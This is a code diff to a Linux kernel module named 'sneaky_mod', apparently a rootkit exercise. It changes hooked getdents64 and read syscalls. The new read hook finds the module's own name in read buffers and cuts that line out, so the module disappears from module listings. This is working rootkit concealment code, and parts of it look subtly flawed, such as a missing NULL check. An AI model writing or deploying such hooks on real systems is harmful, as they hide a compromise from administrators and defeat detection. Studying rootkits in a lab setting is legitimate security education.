@@ -87,22 +87,23 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 }
 
 //read
-asmlinkage int (*original_read)(struct pt_regs *);
-asmlinkage int sneaky_read(struct pt_regs *regs) {
+asmlinkage ssize_t (*original_read)(struct pt_regs *);
+asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
   char *buf = (char *)regs->si;
   size_t count = regs->dx;
-  int i;
+  // int i;
 
-
-  int ret = original_read(regs);
+  ssize_t ret = original_read(regs);
 
   const char *name = "sneaky_mod ";
-  // size_t len = strlen(name);
-  char *pos = strnstr(buf, name, 100);
+  const size_t len = strlen(name);
+
+  char *pos = strnstr(buf, name, len);
   if (pos) {
-    for (i = 0 ; i < count ; i++ ) {
-      buf[i] = 0x0;
-    }
+    // printk(KERN_INFO "sneaky_mod found fd=%ld\n", ret);
+    char *newline = strchr(pos, '\n');
+    memmove(pos, newline + 1, count - strlen(newline) - 1);
+    ret -= (newline - pos) + 1;
   }
 
   return ret;
